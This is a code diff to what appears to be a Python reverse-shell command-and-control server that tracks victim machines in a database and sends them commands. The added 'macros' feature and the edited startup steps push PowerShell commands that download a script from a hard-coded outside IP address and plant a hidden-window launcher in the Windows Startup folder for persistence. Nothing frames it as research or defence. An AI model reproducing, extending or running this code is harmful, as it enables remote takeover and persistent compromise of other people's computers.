@@ -23,11 +23,23 @@ ThreadCount = 0
 
 onlines = {}
 
+macros = {
+    "startup": {"args": [], "steps": [
+            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://139.162.197.217:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
+            "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
+            "Write-Output 'powerShell -windowstyle hidden C:/IFound/mogus.ps1' | Out-File ifound.cmd -encoding ASCII",
+            "cd ~"
+        ]},
+    "discord-message": {"args": ["to", "message"], "steps": [
+        ""
+    ]}
+    
+}
+
 
 def client_handler(connection):
     con = sqlite3.connect('mikshells.db')
     cur = con.cursor()
-    print(connection)
 
     connection.send('whoami'.encode("utf-8"))
     data = connection.recv(1024).decode("utf-8")
@@ -46,7 +58,7 @@ def client_handler(connection):
                     (user, ))
         con.commit()
         startup_steps = [
-            "mkdir C:/IFound; Invoke-WebRequest -Uri 'http://139.162.197.217:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
+            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://139.162.197.217:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
             "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
             "Write-Output 'powerShell -windowstyle hidden C:/IFound/mogus.ps1' | Out-File ifound.cmd -encoding ASCII",
         ]
@@ -80,6 +92,52 @@ def start_server(host, port):
 
     while True:
         accept_connections(ServerSocket)
+
+
+def macros():
+    cur.execute("SELECT info FROM users;")
+    avalible = []
+    for row in cur.fetchall():
+        if row[0] in onlines.keys():
+            avalible.append(row[0])
+    if len(avalible) == 0:
+        print("No users avalible ;(")
+        return
+    print("_"*max(map(len, avalible))+"__")
+    [print(f"{Fore.GREEN}{x[0]+1}.{Style.RESET_ALL} {x[1]}") for x in enumerate(avalible)]
+    print("_"*max(map(len, avalible))+"__")
+    print("Enter the number of the user you want to send a macro to:")
+    try:
+        user = avalible[int(input())-1]
+    except:
+        print("Invalid input")
+        return
+    for num, macro in enumerate(macros.keys()):
+        print(f"{Fore.GREEN}{num+1}.{Style.RESET_ALL} {macro}")
+    print("Enter the number of the macro you want to send:")
+    try:
+        macro = macros.keys()[int(input())-1]
+    except:
+        print("Invalid input")
+        return
+    args = []
+    for arg in macros[macro]["args"]:
+        print(f"Enter the {arg} argument:")
+        args.append(input())
+    steps = macros[macro]["steps"]
+    for step in steps:
+        try:
+            onlines[user]["connection"].send(step.encode("utf-8"))
+            back = json.loads(onlines[user]["connection"].recv(2048*8).decode("utf-8"))
+            print(back["out"])
+        except ConnectionResetError:
+            print("Connection reset")
+            break
+        except:
+            print("Error")
+            break
+
+    
 
 
 def shell():
